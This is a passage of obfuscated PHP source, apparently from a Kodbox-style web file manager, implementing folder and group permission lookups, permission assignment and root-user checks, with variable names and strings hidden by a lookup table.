$¾Æª¬î¤ =& $_SERVER[ªÏ§Ë·]; $âË¼º²˜ = Model($¾Æª¬î¤[1358])->sourceListInfo($°Â¿©»ò, !0); $¯Şâ‡Áî = $this->sourceAuthSelect($°Â¿©»ò); $ÀØ¿ÆÀ² = array(); $ÚôõúšÎ = array(); foreach ($âË¼º²˜ as $ê¿¿Õöô) { unset($ê¿¿Õöô[$¾Æª¬î¤[494]]); unset($ê¿¿Õöô[$¾Æª¬î¤[492]]); unset($ê¿¿Õöô[$¾Æª¬î¤[451]]); unset($ê¿¿Õöô[$¾Æª¬î¤[97]]); $Õâ¥Ø¯£ = $¯Şâ‡Áî[$ê¿¿Õöô[$¾Æª¬î¤[440]]]; if (!$Õâ¥Ø¯£) { continue; } $ê¿¿Õöô[$¾Æª¬î¤[2041]] = $this->authTargetInfo($Õâ¥Ø¯£); $ê¿¿Õöô[$¾Æª¬î¤[547]] = rtrim($ê¿¿Õöô[$¾Æª¬î¤[553]], $¾Æª¬î¤[8]) . $¾Æª¬î¤[8] . ltrim($ê¿¿Õöô[$¾Æª¬î¤[547]], $¾Æª¬î¤[8]); $ÀØ¿ÆÀ²[] = $ê¿¿Õöô; $ášş„à– = count(explode($¾Æª¬î¤[8], trim($ê¿¿Õöô[$¾Æª¬î¤[547]], $¾Æª¬î¤[8]))); $ÚôõúšÎ[] = $ášş„à– + ($ê¿¿Õöô[$¾Æª¬î¤[43]] == $¾Æª¬î¤[85] ? 0 : 1000); } array_multisort($ÚôõúšÎ, SORT_ASC, $ÀØ¿ÆÀ²); return $ÀØ¿ÆÀ²; } private function groupChidldAllRootSource($ùÚ“‘ó) { $ÜÃĞù³í =& $_SERVER[ªÏ§Ë·]; $ó«óĞ‘÷ = Model($ÜÃĞù³í[2042])->groupChildrenAll($ùÚ“‘ó); $ö‘ùÌÓ÷ = array($ÜÃĞù³í[470] => 0, $ÜÃĞù³í[534] => array($ÜÃĞù³í[7], $ó«óĞ‘÷), $ÜÃĞù³í[449] => SourceModel::TYPE_GROUP); $† ÑÅø¡ = Model($ÜÃĞù³í[853])->field($ÜÃĞù³í[440])->where($ö‘ùÌÓ÷)->select(); $† ÑÅø¡ = array_to_keyvalue($† ÑÅø¡, $ÜÃĞù³í[12], $ÜÃĞù³í[440]); return $† ÑÅø¡; } private function authTargetInfo($•†ôä‡) { $º·¨Ä²× =& $_SERVER[ªÏ§Ë·]; $å”åë… = array(); $òÂÆÏ×³ = array(); $ş³ŠÇ€À = 2 << 25; foreach ($•†ôä‡ as $â¶›) { $¦Öİƒƒ = Model($º·¨Ä²×[536])->listData($â¶›[$º·¨Ä²×[1961]]); if (!$¦Öİƒƒ) { continue; } if ($â¶›[$º·¨Ä²×[449]] == SourceModel::TYPE_USER) { $Ğª’ÂÎ = Model($º·¨Ä²×[542])->getInfoSimpleOuter($â¶›[$º·¨Ä²×[534]]); if ($Ğª’ÂÎ[$º·¨Ä²×[1667]] == $º·¨Ä²×[1213]) { continue; } if ($Ğª’ÂÎ[$º·¨Ä²×[1667]] == $º·¨Ä²×[208]) { $Ğª’ÂÎ[$º·¨Ä²×[42]] = LNG($º·¨Ä²×[2043]); } } else { $Ğª’ÂÎ = Model($º·¨Ä²×[550])->getInfoSimple($â¶›[$º·¨Ä²×[534]]); } if (!$Ğª’ÂÎ) { continue; } $Ğª’ÂÎ[$º·¨Ä²×[505]] = $¦Öİƒƒ; $å”åë…[] = $Ğª’ÂÎ; $†åƒÕ¢¶ = 0; if ($â¶›[$º·¨Ä²×[449]] == SourceModel::TYPE_GROUP) { $†åƒÕ¢¶ = $ş³ŠÇ€À * 2; } if ($â¶›[$º·¨Ä²×[449]] == SourceModel::TYPE_USER) { $†åƒÕ¢¶ = $ş³ŠÇ€À; } if ($â¶›[$º·¨Ä²×[449]] == SourceModel::TYPE_USER && $â¶›[$º·¨Ä²×[534]] == $º·¨Ä²×[208]) { $†åƒÕ¢¶ = 0; } $òÂÆÏ×³[] = $¦Öİƒƒ[$º·¨Ä²×[451]] + $†åƒÕ¢¶; } array_multisort($òÂÆÏ×³, SORT_DESC, $å”åë…); return $å”åë…; } public function getAllChildrenByUser($éèøÁı‚, $Áİò«Œš) { $«‡³ˆÓŠ =& $_SERVER[ªÏ§Ë·]; $Ì¡”ºà± = Model($«‡³ˆÓŠ[563])->getInfo($Áİò«Œš); if (!$Áİò«Œš || !$éèøÁı‚ || !$Ì¡”ºà±) { return array(); } $ø‰Ñ¡‹÷ = Model($«‡³ˆÓŠ[1358])->sourceInfo($éèøÁı‚); $˜–“ÕÜÀ = array(); $ŸŞğÀÕ = 1; if ($ø‰Ñ¡‹÷[$«‡³ˆÓŠ[470]] == $«‡³ˆÓŠ[208] && $ø‰Ñ¡‹÷[$«‡³ˆÓŠ[534]] != $ŸŞğÀÕ && $this->groupContainUser($ø‰Ñ¡‹÷[$«‡³ˆÓŠ[534]], $Áİò«Œš)) { foreach ($Ì¡”ºà±[$«‡³ˆÓŠ[2044]] as $î—‘…Ô) { $¶…Ç„¨È = Model($«‡³ˆÓŠ[550])->getInfo($î—‘…Ô[$«‡³ˆÓŠ[1857]]); $Øü€§á® = Model($«‡³ˆÓŠ[563])->getInfoSimpleOuter($Áİò«Œš); $Øü€§á®[$«‡³ˆÓŠ[505]] = $î—‘…Ô[$«‡³ˆÓŠ[451]]; if (Model($«‡³ˆÓŠ[536])->authCheckAction($î—‘…Ô[$«‡³ˆÓŠ[451]][$«‡³ˆÓŠ[451]], $«‡³ˆÓŠ[1878])) { continue; } $¤æ©è° = array($«‡³ˆÓŠ[42] => $«‡³ˆÓŠ[1233] . $¶…Ç„¨È[$«‡³ˆÓŠ[42]], $«‡³ˆÓŠ[440] => $¶…Ç„¨È[$«‡³ˆÓŠ[97]][$«‡³ˆÓŠ[440]], $«‡³ˆÓŠ[94] => KodIO::make($¶…Ç„¨È[$«‡³ˆÓŠ[97]][$«‡³ˆÓŠ[440]]), $«‡³ˆÓŠ[470] => $«‡³ˆÓŠ[208], $«‡³ˆÓŠ[449] => $«‡³ˆÓŠ[543], $«‡³ˆÓŠ[43] => $«‡³ˆÓŠ[582], $«‡³ˆÓŠ[547] => $¶…Ç„¨È[$«‡³ˆÓŠ[554]], $«‡³ˆÓŠ[1857] => $¶…Ç„¨È[$«‡³ˆÓŠ[1857]], $«‡³ˆÓŠ[551] => $¶…Ç„¨È[$«‡³ˆÓŠ[470]], $«‡³ˆÓŠ[2041] => array($Øü€§á®)); $˜–“ÕÜÀ[$¤æ©è°[$«‡³ˆÓŠ[440]]] = $¤æ©è°; } } $û›åËÒ = array(); $ª¹ìµ÷Ë = $this->getAllChildren($éèøÁı‚); foreach ($ª¹ìµ÷Ë as $åøÍÌ„°) { $ñ†¹Ó«³ = !1; foreach ($åøÍÌ„°[$«‡³ˆÓŠ[2041]] as $ˆîÖøƒÚ) { if ($ˆîÖøƒÚ[$«‡³ˆÓŠ[1667]]) { if ($ˆîÖøƒÚ[$«‡³ˆÓŠ[1667]] == $Áİò«Œš) { $ñ†¹Ó«³ = !0; break; } } if ($ˆîÖøƒÚ[$«‡³ˆÓŠ[1857]]) { if ($this->groupContainUser($ˆîÖøƒÚ[$«‡³ˆÓŠ[1857]], $Áİò«Œš)) { $ñ†¹Ó«³ = !0; break; } } } if ($ñ†¹Ó«³) { $û›åËÒ[] = $åøÍÌ„°; } $Å†‘¶â = $åøÍÌ„°[$«‡³ˆÓŠ[440]]; if (isset($˜–“ÕÜÀ[$Å†‘¶â])) { $åøÍÌ„°[$«‡³ˆÓŠ[2041]][] = $˜–“ÕÜÀ[$Å†‘¶â][0]; $˜–“ÕÜÀ[$Å†‘¶â] = !1; } } $˜–“ÕÜÀ = array_filter(array_values($˜–“ÕÜÀ)); $û›åËÒ = array_merge($˜–“ÕÜÀ, $û›åËÒ); return $û›åËÒ; } public function setAllChildrenByUser($›¯¶Ö›è, $Õ¹½Ú¾ş, $æ ‡š„ó) { $Ù©¸º­‡ =& $_SERVER[ªÏ§Ë·]; $¾Ÿù±„œ = $this->getAllChildrenByUser($›¯¶Ö›è, $Õ¹½Ú¾ş); if (!$æ ‡š„ó || !$¾Ÿù±„œ) { return !1; } foreach ($¾Ÿù±„œ as $ÏùèôâĞ) { $‚şÆ›Òş = array(); foreach ($ÏùèôâĞ[$Ù©¸º­‡[2041]] as $Ñğëõ…ô) { $ÈÎµß­Œ = $Ñğëõ…ô[$Ù©¸º­‡[505]]; $ôğ£Ôá = $Ñğëõ…ô[$Ù©¸º­‡[1667]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Â¡Ç®Úô = $Ñğëõ…ô[$Ù©¸º­‡[1667]] ? $Ñğëõ…ô[$Ù©¸º­‡[1667]] : $Ñğëõ…ô[$Ù©¸º­‡[1857]]; if ($Ñğëõ…ô[$Ù©¸º­‡[1667]] && $Ñğëõ…ô[$Ù©¸º­‡[1667]] == $Õ¹½Ú¾ş) { continue; } $‚şÆ›Òş[] = array($Ù©¸º­‡[440] => $ÏùèôâĞ[$Ù©¸º­‡[440]], $Ù©¸º­‡[449] => $ôğ£Ôá, $Ù©¸º­‡[534] => intval($Â¡Ç®Úô), $Ù©¸º­‡[1961] => isset($ÈÎµß­Œ[$Ù©¸º­‡[437]]) ? intval($ÈÎµß­Œ[$Ù©¸º­‡[437]]) : 0, $Ù©¸º­‡[2021] => isset($ÈÎµß­Œ[$Ù©¸º­‡[2021]]) ? intval($ÈÎµß­Œ[$Ù©¸º­‡[2021]]) : -1); } $‚şÆ›Òş[] = array($Ù©¸º­‡[440] => $ÏùèôâĞ[$Ù©¸º­‡[440]], $Ù©¸º­‡[449] => SourceModel::TYPE_USER, $Ù©¸º­‡[534] => intval($Õ¹½Ú¾ş), $Ù©¸º­‡[1961] => intval($æ ‡š„ó), $Ù©¸º­‡[2021] => -1); $this->where(array($Ù©¸º­‡[455] => $ÏùèôâĞ[$Ù©¸º­‡[440]]))->delete(); $this->addAll($‚şÆ›Òş); } return !0; } public function get($Š¦ñ±Ô) { $Ìñ¦›¢Õ = $this->getSourceList(array($Š¦ñ±Ô), !0); return $Ìñ¦›¢Õ[0]; } public function getSourceList($†°¬ÚÏô, $õ±Ä«„¾ = false, $ÏØ‰À…ƒ = false) { $ÎÍÅø =& $_SERVER[ªÏ§Ë·]; if (!$†°¬ÚÏô) { return array(); } $¹•´ş•ü = Model($ÎÍÅø[1358]); if (!$õ±Ä«„¾ && count($†°¬ÚÏô) == 1) { $õ±Ä«„¾ = array(); $õ±Ä«„¾[$†°¬ÚÏô[0]] = $¹•´ş•ü->sourceInfo($†°¬ÚÏô[0]); } if (!$õ±Ä«„¾) { $£È²£¾ğ = array($ÎÍÅø[455] => array($ÎÍÅø[456], $†°¬ÚÏô)); $õ±Ä«„¾ = $¹•´ş•ü->field($ÎÍÅø[2045])->where($£È²£¾ğ)->select(); $õ±Ä«„¾ = array_to_keyvalue($õ±Ä«„¾, $ÎÍÅø[440]); } $ö˜èî§ù = $†°¬ÚÏô; foreach ($õ±Ä«„¾ as $™Ö¾ËàÀ => $ƒíÒ„–) { $Ç€‰“øÖ = $¹•´ş•ü->parentLevelArray($ƒíÒ„–[$ÎÍÅø[549]]); $ö˜èî§ù = array_merge($ö˜èî§ù, array($™Ö¾ËàÀ), array_reverse($Ç€‰“øÖ)); } $ö˜èî§ù = array_values(array_unique($ö˜èî§ù)); if (!$ö˜èî§ù) { return array(); } $ÖˆÙ˜¦´ = $this->sourceAuthSelect($ö˜èî§ù); $Ù…Ê­€Õ = array(); foreach ($ö˜èî§ù as $›ôºÈ£Æ) { if (isset($ÖˆÙ˜¦´[$›ôºÈ£Æ])) { $Ù…Ê­€Õ[$›ôºÈ£Æ] = $ÖˆÙ˜¦´[$›ôºÈ£Æ]; } } $¸™’ùúÖ = $this->userIsRoot($ÏØ‰À…ƒ); $³Äàƒ¤È = AuthModel::authAll(); $Ô•–§—Æ = array($ÎÍÅø[452] => $³Äàƒ¤È, $ÎÍÅø[2046] => array($ÎÍÅø[457] => 0, $ÎÍÅø[1863] => $³Äàƒ¤È, $ÎÍÅø[458] => LNG($ÎÍÅø[2047]), $ÎÍÅø[1880] => $ÎÍÅø[2048])); $ãúÇµ = array(); foreach ($õ±Ä«„¾ as $›ôºÈ£Æ => $ÓùüÁÛË) { if ($¸™’ùúÖ && $GLOBALS[$ÎÍÅø[6]][$ÎÍÅø[1876]]) { $ãúÇµ[$›ôºÈ£Æ] = $Ô•–§—Æ; continue; } $ãúÇµ[$›ôºÈ£Æ] = $this->makeSourceAuth($ÓùüÁÛË, $Ù…Ê­€Õ, $ÏØ‰À…ƒ); } return $ãúÇµ; } public function authDeepCheck($ÄÜÒ™ú•, $‡§ª² = false) { $´Ó°İ£ =& $_SERVER[ªÏ§Ë·]; $‡§ª² = $‡§ª² ? $‡§ª² : USER_ID; $„‡Ñ†Çğ = $this->makeAuthDeep($‡§ª²); if (!in_array($ÄÜÒ™ú•, $„‡Ñ†Çğ[$´Ó°İ£[2049]])) { return !1; } $º´å‘Ş = array(); foreach ($„‡Ñ†Çğ[$´Ó°İ£[2050]] as $ÛœˆÚÏÈ => $¥¹âÀõ) { if (!in_array($ÄÜÒ™ú•, $¥¹âÀõ)) { continue; } $º´å‘Ş[] = $ÛœˆÚÏÈ; } if (!$º´å‘Ş) { return !1; } $ù¯€ûŠÃ = $º´å‘Ş ? $º´å‘Ş[0] : $ÄÜÒ™ú•; return array($´Ó°İ£[452] => -1, $´Ó°İ£[505] => array($´Ó°İ£[457] => $´Ó°İ£[1213], $´Ó°İ£[1863] => $´Ó°İ£[208], $´Ó°İ£[458] => LNG($´Ó°İ£[2051]), $´Ó°İ£[1880] => $´Ó°İ£[2052]), $´Ó°İ£[2053] => LNG($´Ó°İ£[2054]), $´Ó°İ£[2055] => $this->sourceAuthInfo($ù¯€ûŠÃ)); } protected function makeAuthDeep($åúÍÇÈ• = false) { $â¥…Ö =& $_SERVER[ªÏ§Ë·]; static $…Ãëì–à = array(); $åúÍÇÈ• = $åúÍÇÈ• ? $åúÍÇÈ• : USER_ID; if (isset($…Ãëì–à[$åúÍÇÈ•])) { return $…Ãëì–à[$åúÍÇÈ•]; } $ÊŒ¦èœ¯ = Model($â¥…Ö[2056])->listData(); $¡Õ†€ = array(); foreach ($ÊŒ¦èœ¯ as $éÎÉ¹ŒÖ) { if ($éÎÉ¹ŒÖ[$â¥…Ö[451]] == 0 && $éÎÉ¹ŒÖ[$â¥…Ö[1879]] == $â¥…Ö[98]) { $¡Õ†€[] = $éÎÉ¹ŒÖ[$â¥…Ö[437]]; } } $ü“À½”‚ = $this->userGroupParents($åúÍÇÈ•); $ƒ¥âËÕ£ = array($â¥…Ö[449] => SourceModel::TYPE_USER, $â¥…Ö[534] => $åúÍÇÈ•); if ($ü“À½”‚) { $ƒ¥âËÕ£ = array(array($â¥…Ö[449] => SourceModel::TYPE_USER, $â¥…Ö[534] => $åúÍÇÈ•), array($â¥…Ö[449] => SourceModel::TYPE_GROUP, $â¥…Ö[534] => array($â¥…Ö[456], $ü“À½”‚)), $â¥…Ö[1025] => $â¥…Ö[1955]); } $ú£„ìĞ´ = $this->field($â¥…Ö[2057])->where($ƒ¥âËÕ£)->select(); $œîıï¸ = array(); $ì˜ËÁçº = array_to_keyvalue_group($ú£„ìĞ´, $â¥…Ö[440]); foreach ($ì˜ËÁçº as $¦ºÅ™œô => $˜§™ÄšŞ) { $³ÊóıÑ = $this->authArrayCheck($˜§™ÄšŞ, $åúÍÇÈ•); if ($³ÊóıÑ[$â¥…Ö[452]] > 0) { $œîıï¸[] = $¦ºÅ™œô . $â¥…Ö[12]; } } if ($ü“À½”‚) { $­¯®ë®— = Model($â¥…Ö[550]); foreach ($ü“À½”‚ as $•¦ïóùÓ) { $“Èì²øÒ = $­¯®ë®—->getInfo($•¦ïóùÓ); if (!$“Èì²øÒ || !is_array($“Èì²øÒ[$â¥…Ö[97]])) { continue; } $œîıï¸[] = $“Èì²øÒ[$â¥…Ö[97]][$â¥…Ö[440]]; } } $ Ì¢šâØ = array(); $ä›İÉªå = $ü“À½”‚; $¥çí¦¥ö = Model($â¥…Ö[1358]); $­¯®ë®— = Model($â¥…Ö[550]); $Œ –ªÓ€ = array(); $ÌŒ‰—‘ = array(); $åçıöÃÇ = array(); $†¨Æİæù = array(); if ($œîıï¸) { $Áè¯“•Ã = $¥çí¦¥ö->where(array($â¥…Ö[440] => array($â¥…Ö[456], $œîıï¸)))->select(); foreach ($Áè¯“•Ã as $Ã•”´ªÅ) { $»³í™½­ = $¥çí¦¥ö->parentLevelArray($Ã•”´ªÅ[$â¥…Ö[549]]); $ Ì¢šâØ = array_merge($ Ì¢šâØ, $»³í™½­); $ä›İÉªå[] = $Ã•”´ªÅ[$â¥…Ö[534]]; $Œ –ªÓ€[$Ã•”´ªÅ[$â¥…Ö[440]]] = $»³í™½­; $ÌŒ‰—‘[$Ã•”´ªÅ[$â¥…Ö[440]]] = $Ã•”´ªÅ[$â¥…Ö[534]]; } } $ä›İÉªå = array_values(array_unique($ä›İÉªå)); $âÌ——ûé = $ä›İÉªå; foreach ($âÌ——ûé as $•¦ïóùÓ) { $“Èì²øÒ = $­¯®ë®—->getInfo($•¦ïóùÓ); $»³í™½­ = $¥çí¦¥ö->parentLevelArray($“Èì²øÒ[$â¥…Ö[549]]); $ä›İÉªå = array_merge($ä›İÉªå, $»³í™½­); } $ä›İÉªå = array_values(array_unique($ä›İÉªå)); foreach ($ä›İÉªå as $•¦ïóùÓ) { $“Èì²øÒ = $­¯®ë®—->getInfo($•¦ïóùÓ); $ Ì¢šâØ[] = $“Èì²øÒ[$â¥…Ö[97]][$â¥…Ö[440]]; $åçıöÃÇ[$•¦ïóùÓ] = $“Èì²øÒ[$â¥…Ö[97]][$â¥…Ö[440]]; $†¨Æİæù[$•¦ïóùÓ] = $¥çí¦¥ö->parentLevelArray($“Èì²øÒ[$â¥…Ö[549]]); } foreach ($Œ –ªÓ€ as $êşåó±” => $üïƒæ×ñ) { $·åóºäæ = $ÌŒ‰—‘[$êşåó±”]; if (!$·åóºäæ || !$åçıöÃÇ[$·åóºäæ]) { continue; } $»ÖœÚÅı = array(); foreach ($†¨Æİæù[$·åóºäæ] as $•¦ïóùÓ) { $»ÖœÚÅı[] = $åçıöÃÇ[$•¦ïóùÓ]; } $Œ –ªÓ€[$êşåó±”] = array_merge($»ÖœÚÅı, $üïƒæ×ñ); } $ Ì¢šâØ = array_values(array_unique($ Ì¢šâØ)); $­½ñéïÀ = array($â¥…Ö[2049] => $ Ì¢šâØ, $â¥…Ö[2050] => $Œ –ªÓ€); $…Ãëì–à[$åúÍÇÈ•] = $­½ñéïÀ; return $­½ñéïÀ; } private function makeSourceAuth($²Š¡‹, $ÔÔªš¡ï, $µ–³É›Œ = false) { $œ»’¼¶ç =& $_SERVER[ªÏ§Ë·]; $¡‡¿Îıƒ = $œ»’¼¶ç[98]; $§ïëı›ø = $²Š¡‹[$œ»’¼¶ç[534]]; $İ‹¨·—Á = $²Š¡‹[$œ»’¼¶ç[449]] == SourceModel::TYPE_GROUP; $•Ú¹êæ¬ = $İ‹¨·—Á ? $this->groupRootAuth($§ïëı›ø, $µ–³É›Œ) : !1; if ($•Ú¹êæ¬ && Model($œ»’¼¶ç[536])->authCheckAction($•Ú¹êæ¬[$œ»’¼¶ç[451]], $œ»’¼¶ç[1878])) { return $this->groupAuthInfo($•Ú¹êæ¬, $§ïëı›ø); } $®¸Å„†ò = Model($œ»’¼¶ç[1358])->parentLevelArray($²Š¡‹[$œ»’¼¶ç[549]]); $®¸Å„†ò = array_merge(array($²Š¡‹[$œ»’¼¶ç[440]]), array_reverse($®¸Å„†ò)); $ßÀü¯”Ù = !1; foreach ($®¸Å„†ò as $£Í¤¢ü) { if (!isset($ÔÔªš¡ï[$£Í¤¢ü])) { continue; } $çò”¨Ùë = $this->authMake($ÔÔªš¡ï[$£Í¤¢ü], $µ–³É›Œ); if ($çò”¨Ùë[$œ»’¼¶ç[505]]) { $ßÀü¯”Ù = $çò”¨Ùë; break; } } if (!$İ‹¨·—Á) { return $ßÀü¯”Ù; } if (!$ßÀü¯”Ù && $•Ú¹êæ¬) { $ßÀü¯”Ù = $this->groupAuthInfo($•Ú¹êæ¬, $§ïëı›ø); } if (!$ßÀü¯”Ù) { $€©Ú¡Â˜ = Model($œ»’¼¶ç[550])->getInfo($§ïëı›ø); $·´ö±­ = explode($œ»’¼¶ç[60], trim($€©Ú¡Â˜[$œ»’¼¶ç[549]], $œ»’¼¶ç[60])); $·´ö±­ = array_reverse($·´ö±­); foreach ($·´ö±­ as $—¡İˆÅ²) { if ($—¡İˆÅ² == $œ»’¼¶ç[208] || $—¡İˆÅ² == $¡‡¿Îıƒ) { continue; } $èèå™â¥ = $this->groupRootAuth($—¡İˆÅ², $µ–³É›Œ); if (!$èèå™â¥) { continue; } $ßÀü¯”Ù = $this->groupAuthInfo($èèå™â¥, $—¡İˆÅ²); break; } } if (!$ßÀü¯”Ù || $ßÀü¯”Ù[$œ»’¼¶ç[452]] <= 0) { $úÕ¤¿Ø… = $this->authDeepCheck($²Š¡‹[$œ»’¼¶ç[440]], $µ–³É›Œ); if ($úÕ¤¿Ø…) { $ßÀü¯”Ù = $úÕ¤¿Ø…; } } return $ßÀü¯”Ù; } private function userIsRoot($½ ëÕĞ– = false) { $ÚùÆõÁî =& $_SERVER[ªÏ§Ë·]; if (!$½ ëÕĞ– && _get($GLOBALS, $ÚùÆõÁî[532])) { return !0; } $“òëã…Ü = Model($ÚùÆõÁî[563])->getInfo($½ ëÕĞ–); $èêûŸñ» = Model($ÚùÆõÁî[2058])->listData($“òëã…Ü[$ÚùÆõÁî[1548]]); if ($èêûŸñ» && $èêûŸñ»[$ÚùÆõÁî[540]][$ÚùÆõÁî[2059]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Âñ˜øœ¡) { $ìÖñ†ø =& $_SERVER[ªÏ§Ë·]; $ƒ—’îŞà = Model($ìÖñ†ø[1358]); $Ê¯ˆÙé© = $ƒ—’îŞà->sourceInfo($Âñ˜øœ¡); if (!$Ê¯ˆÙé©) { return !1; } $ƒ—’îŞà->groupPathDisplay($Ê¯ˆÙé©); $™„†½— = array($Ê¯ˆÙé©); $™„†½— = $ƒ—’îŞà->_listAppendPath($™„†½—); $Ê¯ˆÙé© = $™„†½—[0]; $ÉÎãïå = $Ê¯ˆÙé©[$ìÖñ†ø[547]]; if (isset($Ê¯ˆÙé©[$ìÖñ†ø[555]])) { $æ‘Úäõû = explode($ìÖñ†ø[8], trim($Ê¯ˆÙé©[$ìÖñ†ø[547]], $ìÖñ†ø[8])); array_shift($æ‘Úäõû); $ÉÎãïå = $Ê¯ˆÙé©[$ìÖñ†ø[553]] . $ìÖñ†ø[2060] . implode($ìÖñ†ø[8], $æ‘Úäõû); } return array($ìÖñ†ø[458] => $Ê¯ˆÙé©[$ìÖñ†ø[42]], $ìÖñ†ø[94] => KodIO::make($Ê¯ˆÙé©[$ìÖñ†ø[440]]), $ìÖñ†ø[2061] => $ÉÎãïå); } private function groupAuthInfo($™ŞÄòşÂ, $õ¿ÚİÁ) { $·Œ«ãÑ¼ =& $_SERVER[ªÏ§Ë·]; $Œ‹ªıïı = Model($·Œ«ãÑ¼[550])->getInfo($õ¿ÚİÁ); return array($·Œ«ãÑ¼[2062] => intval($™ŞÄòşÂ[$·Œ«ãÑ¼[451]]), $·Œ«ãÑ¼[2046] => $™ŞÄòşÂ, $·Œ«ãÑ¼[2063] => LNG($·Œ«ãÑ¼[2064]), $·Œ«ãÑ¼[2055] => array($·Œ«ãÑ¼[458] => $Œ‹ªıïı[$·Œ«ãÑ¼[42]], $·Œ«ãÑ¼[94] => KodIO::make($Œ‹ªıïı[$·Œ«ãÑ¼[97]][$·Œ«ãÑ¼[440]]), $·Œ«ãÑ¼[2061] => $Œ‹ªıïı[$·Œ«ãÑ¼[554]])); } protected function groupRootAuth($·™Ä¦¾–, $±†õëö€ = false) { $”‡é©ñÒ =& $_SERVER[ªÏ§Ë·]; $±†õëö€ = $±†õëö€ ? $±†õëö€ : USER_ID; $ÖéˆµŸª = $±†õëö€ . $”‡é©ñÒ[2065] . $·™Ä¦¾–; static $ÁÀçÀÍ = array(); if (isset($ÁÀçÀÍ[$ÖéˆµŸª])) { return $ÁÀçÀÍ[$ÖéˆµŸª]; } $İÙÄ Â = Model($”‡é©ñÒ[550])->getInfo($·™Ä¦¾–); $­ŞÇ«ºÓ = $this->userGroupList($±†õëö€); $“¶ñ‚ïœ = isset($­ŞÇ«ºÓ[$·™Ä¦¾–]) ? $­ŞÇ«ºÓ[$·™Ä¦¾–][$”‡é©ñÒ[451]] : !1; if ($“¶ñ‚ïœ && Model($”‡é©ñÒ[536])->authCheckAction($“¶ñ‚ïœ[$”‡é©ñÒ[451]], $”‡é©ñÒ[1878])) { $ÁÀçÀÍ[$ÖéˆµŸª] = $“¶ñ‚ïœ; return $“¶ñ‚ïœ; } $äÎášÁ = $this->sourceAuthSelect($İÙÄ Â[$”‡é©ñÒ[97]][$”‡é©ñÒ[440]]); $ªğı­î… = $äÎášÁ ? $this->authMake($äÎášÁ, $±†õëö€) : !1; $ñ÷îÂó‚ = $ªğı­î… ? $ªğı­î…[$”‡é©ñÒ[505]] : !1; $ÁÀçÀÍ[$ÖéˆµŸª] = $ñ÷îÂó‚ ? $ñ÷îÂó‚ : $“¶ñ‚ïœ; return $ÁÀçÀÍ[$ÖéˆµŸª]; } public function authOwnerApply($ç„¢Ç›) { $ç×ø¤Š =& $_SERVER[ªÏ§Ë·]; if (empty($ç„¢Ç›[$ç×ø¤Š[451]]) || isset($ç„¢Ç›[$ç×ø¤Š[2066]]) && $ç„¢Ç›[$ç×ø¤Š[2066]]) { return $ç„¢Ç›; } if (AuthModel::authCheckRoot($ç„¢Ç›[$ç×ø¤Š[451]][$ç×ø¤Š[452]])) { return $ç„¢Ç›; } $¥òÄÅì× = Model($ç×ø¤Š[1358])->parentLevelArray($ç„¢Ç›[$ç×ø¤Š[549]]); $¥òÄÅì× = array_merge(array($ç„¢Ç›[$ç×ø¤Š[440]]), array_reverse($¥òÄÅì×)); $ÀÀ‘Òù¹ = $this->sourceAuthSelect($¥òÄÅì×); $¦º“ÜÜ´ = array(); $¡œÓı = array(); foreach ($ÀÀ‘Òù¹ as $Úû·†Àñ => $ªÕæä¤) { $ÏûüâØ = $this->authFolderOwnerUser($ªÕæä¤); $¦º“ÜÜ´[$Úû·†Àñ] = $ÏûüâØ; $¡œÓı = array_merge($¡œÓı, $ÏûüâØ[$ç×ø¤Š[628]]); if ($ÏûüâØ[$ç×ø¤Š[2067]]) { break; } } if (count($¡œÓı) == 0) { $¡œÓı = $this->authFolderOwnerGroup($ç„¢Ç›[$ç×ø¤Š[534]]); } $¡œÓı = array_unique($¡œÓı); if (AuthModel::authCheckRoot($ç„¢Ç›[$ç×ø¤Š[451]][$ç×ø¤Š[452]])) { $¡œÓı[] = USER_ID; } $ç„¢Ç›[$ç×ø¤Š[451]][$ç×ø¤Š[2068]] = Model($ç×ø¤Š[542])->userListInfo($¡œÓı); return $ç„¢Ç›; } private function authFolderOwnerGroup($™‹³‡Ï) { $ÁöüñÁ =& $_SERVER[ªÏ§Ë·]; $·î­×í‰ = Model($ÁöüñÁ[1947])->where(array($ÁöüñÁ[1857] => $™‹³‡Ï))->select(); $çÔ‰”‰ = array(); if (!$·î­×í‰) { return $çÔ‰”‰; } foreach ($·î­×í‰ as $Šàí’—²) { $¼‰îàûØ = $this->authInfo($Šàí’—²); if (AuthModel::authCheckRoot($¼‰îàûØ[$ÁöüñÁ[451]])) { $çÔ‰”‰[] = $Šàí’—²[$ÁöüñÁ[1667]]; } } return $çÔ‰”‰; } private function authFolderOwnerUser($¾æ¸ÉÚ) { $å‘±ò²Ú =& $_SERVER[ªÏ§Ë·]; $€Šëñæ– = array(); $˜ú³éÇß = !1; foreach ($¾æ¸ÉÚ as $Æò÷³ÇÈ) { $‡’¶õË‡ = $this->authInfo($Æò÷³ÇÈ); if ($Æò÷³ÇÈ[$å‘±ò²Ú[534]] == $å‘±ò²Ú[208]) { $˜ú³éÇß = !0; } if ($Æò÷³ÇÈ[$å‘±ò²Ú[449]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($‡’¶õË‡[$å‘±ò²Ú[451]])) { $€Šëñæ–[] = $Æò÷³ÇÈ[$å‘±ò²Ú[534]]; } } } return array($å‘±ò²Ú[628] => $€Šëñæ–, $å‘±ò²Ú[2067] => $˜ú³éÇß); } public function authMake($˜±•óš, $ôŠ•¬¹Ö = false) { $Á—Ô»©æ =& $_SERVER[ªÏ§Ë·]; $¦©­»Ë± = $this->authArrayCheck($˜±•óš, $ôŠ•¬¹Ö); if ($¦©­»Ë±[$Á—Ô»©æ[2069]]) { $¦©­»Ë±[$Á—Ô»©æ[2069]] = $this->sourceAuthInfo($¦©­»Ë±[$Á—Ô»©æ[2069]]); } return $¦©­»Ë±; } public function authArrayCheck($í§ğæ§¿, $ºöˆ¤ = false) { $š™¡ =& $_SERVER[ªÏ§Ë·]; if (!$í§ğæ§¿) { return array($š™¡[452] => 0, $š™¡[505] => !1); } $ºöˆ¤ = $ºöˆ¤ ? $ºöˆ¤ : USER_ID; $÷¼ˆÕë = 0; $Ï°˜¿´° = 0; $õ¾Ó÷ËŞ = 0; $ĞŞø«©ş = 0; $Ö…Ô›‰• = 0; $ÎÔÙ›î = 0; $íïçŸÉü = 1000; $¯ğÌ¦—¡ = 0; $˜Ó—ª¹ã = 0; $¡’…¡–Ô = 0; $©—¡¤ôÜ = 0; $øÛ†Æ = array($š™¡[440] => 0); foreach ($í§ğæ§¿ as $øÛ†Æ) { 